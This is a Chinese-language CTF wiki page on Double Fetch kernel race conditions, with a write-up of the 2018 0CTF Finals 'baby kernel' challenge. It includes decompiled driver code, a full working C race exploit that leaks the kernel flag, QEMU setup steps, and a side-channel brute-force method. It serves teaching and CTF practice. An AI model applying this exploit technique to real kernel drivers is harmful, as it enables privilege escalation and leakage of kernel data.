[EN](./double-fetch.md) | [ZH](./double-fetch-zh.md)

# Double Fetch
## 概述
`Double Fetch` 从漏洞原理上属于条件竞争漏洞，是一种内核态与用户态之间的数据访问竞争。

在 Linux 等现代操作系统中，虚拟内存地址通常被划分为内核空间和用户空间。内核空间负责运行内核代码、驱动模块代码等，权限较高。而用户空间运行用户代码，并通过系统调用进入内核完成相关功能。通常情况下，用户空间向内核传递数据时，内核先通过通过 `copy_from_user ` 等拷贝函数将用户数据拷贝至内核空间进行校验及相关处理，但在输入数据较为复杂时，内核可能只引用其指针，而将数据暂时保存在用户空间进行后续处理。此时，该数据存在被其他恶意线程篡改风险，造成内核验证通过数据与实际使用数据不一致，导致内核代码执行异常。

一个典型的 `Double Fetch`  漏洞原理如下图所示，一个用户态线程准备数据并通过系统调用进入内核，该数据在内核中有两次被取用，内核第一次取用数据进行安全检查（如缓冲区大小、指针可用性等），当检查通过后内核第二次取用数据进行实际处理。而在两次取用数据之间，另一个用户态线程可创造条件竞争，对已通过检查的用户态数据进行篡改，在真实使用时造成访问越界或缓冲区溢出，最终导致内核崩溃或权限提升。



![典型的Double Fetch原理图](./double-fetch.png)

## 2018 0CTF Finals Baby Kernel

### 题目分析

首先用 IDA 对驱动文件进行分析，可见 flag 是硬编码在驱动文件中的。

```c
.data:0000000000000480 flag            dq offset aFlagThisWillBe
.data:0000000000000480                                         ; DATA XREF: baby_ioctl+2A↑r
.data:0000000000000480                                         ; baby_ioctl+DB↑r ...
.data:0000000000000480                                         ; "flag{THIS_WILL_BE_YOUR_FLAG_1234}"
.data:0000000000000488                 align 20h
```

驱动主要注册了一个 `baby_ioctl`  函数，其中包含两个功能。当 ioctl 中 cmd 参数为 0x6666 时，驱动将输出flag 的加载地址。当 ioctl 中 cmd 参数为 0x1337 时，首先进行三个校验，接着对用户输入的内容与硬编码的 flag 进行逐字节比较，当一致时通过 `printk` 将 flag 输出出来。

```c
signed __int64 __fastcall baby_ioctl(__int64 a1, attr *a2)
{
  attr *v2; // rdx
  signed __int64 result; // rax
  int i; // [rsp-5Ch] [rbp-5Ch]
  attr *v5; // [rsp-58h] [rbp-58h]

  _fentry__(a1, a2);
  v5 = v2;
  if ( (_DWORD)a2 == 0x6666 )
  {
    printk("Your flag is at %px! But I don't think you know it's content\n", flag);
    result = 0LL;
  }
  else if ( (_DWORD)a2 == 0x1337
         && !_chk_range_not_ok((__int64)v2, 16LL, *(_QWORD *)(__readgsqword((unsigned __int64)&current_task) + 4952))
         && !_chk_range_not_ok(
               v5->flag_str,
               SLODWORD(v5->flag_len),
               *(_QWORD *)(__readgsqword((unsigned __int64)&current_task) + 4952))
         && LODWORD(v5->flag_len) == strlen(flag) )
  {
    for ( i = 0; i < strlen(flag); ++i )
    {
      if ( *(_BYTE *)(v5->flag_str + i) != flag[i] )
        return 0x16LL;
    }
    printk("Looks like the flag is not a secret anymore. So here is it %s\n", flag);
    result = 0LL;
  }
  else
  {
    result = 0xELL;
  }
  return result;
}
```

而分析其检查函数，其中 `_chk_range_not_ok` 为检查指针及长度范围是否指向用户空间。通过对驱动文件功能的分析，可以得到用户输入的数据结构体如下：

```
00000000 attr            struc ; (sizeof=0x10, mappedto_3)
00000000 flag_str        dq ?
00000008 flag_len        dq ?
00000010 attr            ends
```

其检查内容为：

1. 输入的数据指针是否为用户态数据。
2. 数据指针内flag\_str是否指向用户态。
3. 据指针内flag\_len是否等于硬编码flag的长度。

### 解题思路
根据 `Double Fetch` 漏洞原理，发现此题目存在一个 `Double Fetch` 漏洞，当用户输入数据通过验证后，再将 `flag_str` 所指向的地址改为 flag 硬编码地址后，即会输出 flag 内容。

首先，利用提供的 `cmd=0x6666` 功能，获取内核中 flag 的加载地址。

> 内核中以 `printk` 输出的内容，可以通过 `dmesg` 命令查看。

然后，构造符合 `cmd=0x1337` 功能的数据结构，其中 `flag_len` 可以从硬编码中直接获取为 33， `flag_str` 指向一个用户空间地址。

最后，创建一个恶意线程，不断的将 `flag_str` 所指向的用户态地址修改为 flag 的内核地址以制造竞争条件，从而使其通过驱动中的逐字节比较检查，输出 flag 内容。

### Exploit
```c
// gcc -static exp.c -lpthread -o exp
#include <string.h>
char *strstr(const char *haystack, const char *needle);
#define _GNU_SOURCE         /* See feature_test_macros(7) */
#include <string.h>
char *strcasestr(const char *haystack, const char *needle);
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <pthread.h>

#define TRYTIME 0x1000  //碰撞次数
#define LEN 0x1000

struct attr
{
    char *flag;
    size_t len;
};
unsigned long long addr;
int finish =0;
char buf[LEN+1]={0};
//线程函数，不断修改flag指向的地址为内核中flag地址
void change_attr_value(void *s){
    struct attr * s1 = s; 
    while(finish==0){
    s1->flag = addr;
    }
}

int main(void)
{
    int addr_fd;
    char *idx;
    int fd = open("/dev/baby",0);
    int ret = ioctl(fd,0x6666);    
    pthread_t t1;
    struct attr t;
    setvbuf(stdin,0,2,0);
    setvbuf(stdout,0,2,0);
    setvbuf(stderr,0,2,0);   
	//获取内核硬编码的flag地址
    system("dmesg > /tmp/record.txt");
    addr_fd = open("/tmp/record.txt",O_RDONLY);
    lseek(addr_fd,-LEN,SEEK_END);
    read(addr_fd,buf,LEN);
    close(addr_fd);
    idx = strstr(buf,"Your flag is at ");
    if (idx == 0){
        printf("[-]Not found addr");
        exit(-1);
    }
    else{
        idx+=16;
        addr = strtoull(idx,idx+16,16);
        printf("[+]flag addr: %p\n",addr);
    }
	//构造attr数据结构
    t.len = 33;
    t.flag = buf;
    //新建恶意线程
    pthread_create(&t1, NULL, change_attr_value,&t);
    for(int i=0;i<TRYTIME;i++){
        ret = ioctl(fd, 0x1337, &t);
        t.flag = buf;
    }
    finish = 1;
    pthread_join(t1, NULL);
    close(fd);
    puts("[+]result is :");
    system("dmesg | grep flag");
    return 0;
}
```

### 其他
此题在环境配置时，有几点需要注意。

首先， 需关闭 `dmesg_restrict` ，否则无法查看 `printk` 信息，具体操作是在启动脚本中加入：

```bash
echo 0 > /proc/sys/kernel/dmesg_restrict
```

其次，配置 QEMU 启动参数时， 不要开启 `SMAP` 保护，否则在内核中直接访问用户态数据会引起 `kerne panic` 。

还有，配置 QEMU 启动参数时，需要配置为非单核单线程启动，否则无法触发题目中的竞争条件。具体操作是在启动参数中增加其内核数选项，如：

```bash
-smp 2,cores=2,threads=1  \
```

> 在启动后，可通过 `/proc/cpuinfo` 查看当前运行的内核数及超线程数。

最后，此题存在一种侧信道攻击的非预期解法：

>由于是 flag 是硬编码的，并且是检查方法是逐字节比较，因此可以逐字节爆破来得到 flag。
>
>方法是将待爆破的字节放在 mmap 申请的内存页末位，此时下一字节位于不可读写的用户态空间。当得到正确的一字节时，内核会比较用户空间内下一个字节的正确性，由于该地址是不可读的，将导致 `kernel panic`，从而可以判断是否爆破的一个字节正确。

## Reference
https://www.usenix.org/conference/usenixsecurity17/technical-sessions/presentation/wang-pengfei

https://veritas501.space/2018/06/04/0CTF%20final%20baby%20kernel/

http://p4nda.top/2018/07/20/0ctf-baby/

https://www.freebuf.com/articles/system/156485.html



